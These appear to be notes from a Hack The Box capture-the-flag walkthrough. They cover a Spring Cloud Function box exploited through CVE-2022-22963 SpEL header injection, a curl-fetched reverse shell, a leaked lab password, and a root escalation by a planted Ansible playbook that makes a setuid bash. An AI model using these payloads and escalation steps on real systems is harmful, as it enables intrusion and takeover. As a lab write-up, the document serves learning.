## 📌 Box Info
- **OS**: [Linux](Linux)
- **Difficulty**: [Easy](Easy)
- Platform: [HTB](HTB)

### Recon
- **Ports**: [SSH](SSH) (22), [HTTP](HTTP) (8080)
- **HTTP Tech Stack**: Apache Tomcat (based on error messages), likely Spring Boot based on site behavior and structure
- **Website**:
  - Main page shows upload, register, and blog sections
  - File upload allowed only images, returns link to `/show_image?img=<name>`
  - Directory traversal found through `img=.` and `img=../..`
  - Two home users found: `frank`, `phil`
  - `frank` has Maven settings file with creds for `phil` (not valid over SSH)

### Shell as `frank`
- **Findings**:
  - `/var/www/WebApp` contains a Java SpringBoot application
  - `pom.xml` shows usage of vulnerable `spring-cloud-function-web` version 3.2.2
  - CVE-2022-22963 confirmed via Snyk and manual analysis
- **Exploit**:
  - Header injection in `spring.cloud.function.routing-expression`
  - POC: `T(java.lang.Runtime).getRuntime().exec("ping -c 1 <IP>")`
  - Reverse shell via `curl` to download bash script into `/tmp`, then execute
  - Alternative: base64-encoded shell piped via brace expansion and decoded

### Shell as `phil`
- **Password** found in `~frank/.m2/settings.xml`: `DocPhillovestoInject123`
- SSH blocked for `phil` in `sshd_config`, but `su` works
- `phil` can read `user.txt`

### Shell as `root`
- **Enumeration**:
  - `/opt/automation/tasks/playbook_1.yml` - Ansible playbook run as cron
  - Verified via `pspy`: every 2 mins, root runs `ansible-parallel /opt/automation/tasks/*.yml`
  - Directory writable by `staff`; `phil` is in `staff` group
- **Privilege Escalation**:
  - Create custom Ansible playbook in `/opt/automation/tasks`:
    ```yaml
    - hosts: localhost
      tasks:
      - name: Get root
        shell: cp /bin/bash /tmp/0xdf; chmod 4755 /tmp/0xdf
    ```
  - Wait for cron to run, then execute `/tmp/0xdf -p` for root shell
  - Read `root.txt`

### Summary
- CVE: 2022-22963 exploited via SpEL injection in HTTP headers
- Post-exploit escalation via cron-based Ansible execution
- Lessons:
  - Maven files can leak credentials
  - Snyk and similar tools are helpful for Java dependency analysis
  - Monitoring with `pspy` is useful for catching root-cron behaviors

